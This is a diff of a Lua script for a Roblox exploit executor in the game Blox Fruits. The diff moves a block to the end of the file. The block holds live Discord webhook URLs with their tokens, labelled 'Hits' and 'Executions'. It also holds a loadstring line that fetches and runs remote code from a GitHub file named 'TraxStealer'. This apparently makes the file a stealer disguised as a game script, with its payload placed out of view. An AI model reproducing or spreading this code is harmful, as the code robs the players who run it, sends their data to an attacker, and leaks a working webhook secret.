@@ -1,9 +1,4 @@
-HitsWebhook = "https://discord.com/api/webhooks/1340796672254541964/CHOXlXe5GWUm3QEYz0Kd07Dmc2okMRqlyCRoHU5A9ERCg5Ot-GR-fhnrrqBKOjjaRDhQ"
-Executions_Webhook = "https://discord.com/api/webhooks/1340796672254541964/CHOXlXe5GWUm3QEYz0Kd07Dmc2okMRqlyCRoHU5A9ERCg5Ot-GR-fhnrrqBKOjjaRDhQ"
-Username = "nbvbw"
-Button_Prompt = "Load Script!"
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/TraxMain/BloxFruits/refs/heads/main/TraxStealer"))()
 
 -- Ensure HTTP requests are supported by the exploit
 if not syn and not http and not request then
@@ -94,3 +89,10 @@ game:GetService("Players").PlayerRemoving:Connect(function(leavingPlayer)
         sendWebhook("leave")
     end
 end)
+
+HitsWebhook = "https://discord.com/api/webhooks/1340796672254541964/CHOXlXe5GWUm3QEYz0Kd07Dmc2okMRqlyCRoHU5A9ERCg5Ot-GR-fhnrrqBKOjjaRDhQ"
+Executions_Webhook = "https://discord.com/api/webhooks/1340796672254541964/CHOXlXe5GWUm3QEYz0Kd07Dmc2okMRqlyCRoHU5A9ERCg5Ot-GR-fhnrrqBKOjjaRDhQ"
+Username = "nbvbw"
+Button_Prompt = "Load Script!"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TraxMain/BloxFruits/refs/heads/main/TraxStealer"))()
